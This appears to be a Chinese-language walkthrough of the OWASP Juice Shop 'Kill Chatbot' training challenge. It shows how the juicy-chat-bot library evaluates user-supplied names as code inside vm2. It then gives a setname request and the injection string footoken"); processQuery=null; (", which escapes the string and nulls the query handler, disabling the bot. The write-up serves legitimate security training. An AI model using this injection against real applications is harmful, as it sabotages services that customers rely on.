---
title: Kill Chatbot
description: 搜寻应用程序功能组件使用的库，查看源代码寻找执行点，覆盖原方法破坏对应功能
---

- 描述：永久禁用支持聊天机器人，使其无法再回答客户查询。
- 查看示例解决方案
- 存在 juicy-chat-bot 这个包
    https://www.npmjs.com/package/juicy-chat-bot
    源代码
    https://github.com/juice-shop/juicy-chat-bot
- 查看 ```index.ts``` 文件
    https://github.com/juice-shop/juicy-chat-bot/blob/master/index.ts
    ```typescript
    import { VM } from 'vm2'

    class Bot {
        name: string
        greeting: string
        defaultResponse!: BotResponse
        training!: Training
        factory: VM
    ```

    ```typescript
    addUser(token: string, name: string): void {
        this.factory.run(`users.addUser("${token}", "${name}")`)
    }
    ```
    - ```this.factory.run``` 方法执行参数字符串为代码，注入 ```")``` 逃出字符串与前缀方法 

- 查看 ```factory.ts``` 文件
    https://github.com/juice-shop/juicy-chat-bot/blob/master/factory.ts
    ```typescript
    function processQuery(query: string, token: string): Promise < any > | {
        action: string,
        body: string
    } 
    ```
    - 使用 ```processQuery``` 方法处理查询

- 注入用户名字段，覆盖 ```process``` 方法
    ```POST /rest/chatbot/respond HTTP/1.1```
    ```json
    {
        "action":"setname",
        "query":"name"
    }
    ```
- 向量 ```footoken"); processQuery=null; ("```
    1. 使用```")```逃出字符串与原方法
    2. 覆盖查询处理函数
    3. 使用 ```("``` 关闭结尾的 ```")```